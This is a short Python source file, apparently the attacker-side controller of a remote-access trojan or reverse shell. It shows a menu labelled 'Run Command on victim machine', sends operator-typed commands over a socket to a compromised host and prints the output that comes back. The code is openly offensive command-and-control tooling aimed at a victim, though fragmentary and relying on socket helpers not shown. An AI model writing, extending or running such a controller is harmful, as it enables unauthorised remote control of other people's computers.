

from yaml import compose_all


def showOptions():
    print("\n")
    print("\t\t 1. Run Command on victim machine")

def handleConnection(my_socket):
    print("[+] Handling Connection")
    
    while(True):
        showOptions()
        
        user_input = input("[+] Select Option: ")
        my_socket.send_data(user_input)

        
        if user_input == "1":
            print("Running Commands:")
            print(">>>" , end = " ")
            command = input()
            my_socket.send_data(command)
            
            result = my_socket.recieve_data()
            print(result)

        elif (user_input == "99"):
            break
        else:
            print("[-] Invalid Input")
    
        


